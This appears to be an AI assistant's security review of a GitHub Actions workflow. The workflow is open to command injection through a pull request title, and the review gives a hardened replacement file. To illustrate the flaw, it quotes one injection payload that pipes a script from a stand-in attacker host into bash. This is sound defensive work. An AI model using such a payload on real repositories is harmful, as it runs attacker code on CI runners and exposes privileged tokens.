I don't have write access to files in this session (only read/search tools are available), so I can't apply the edit directly. Here's the assessment and the fix to apply.

**Yes, this is a real vulnerability.** `${{ github.event.pull_request.title }}` is textually substituted into the `run:` script before the shell ever sees it — it's not a shell variable, it's string interpolation into code. Anyone can open a PR with a title like:

```
"; curl -s https://attacker.example/x | bash #
```

and that command executes on the runner. Combined with this workflow's `permissions: write-all`, the attacker gets a fully-privileged `GITHUB_TOKEN` (repo write, packages, etc.) for free on every PR — including from forks.

The file also has two other baseline issues: no SHA-pinned action, and no `timeout-minutes`/`persist-credentials: false`.

**Fixed version of `.github/workflows/deploy.yml`:**

```yaml
---
name: deploy

on:
  pull_request:

permissions: {}

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<full-40-char-SHA> # v4.x.x
        with:
          persist-credentials: false
      - name: Print PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title is $PR_TITLE"
```

Key changes:
- **Title moved into `env:`** and referenced as a quoted shell variable `"$PR_TITLE"` — this is the actual fix, since env values are passed as data, not spliced into script text.
- **`permissions: write-all` → `permissions: {}`** at workflow level, with `contents: read` scoped to the job (all it needs for checkout).
- **`persist-credentials: false`** so the token isn't left on disk for later steps.
- **`timeout-minutes: 10`** added.
- **`actions/checkout` needs pinning to a commit SHA** — I can't resolve/verify one in this session (no shell/API access here), so I left a placeholder. If you can run `gh api repos/actions/checkout/releases/latest --jq .tag_name` and `gh api repos/actions/checkout/commits/<tag> --jq .sha`, I can fill it in, or you can apply that yourself.

Want me to try again in a session with tool access so I can apply this edit and run `actionlint`/`zizmor` to verify, or will you apply the diff above?
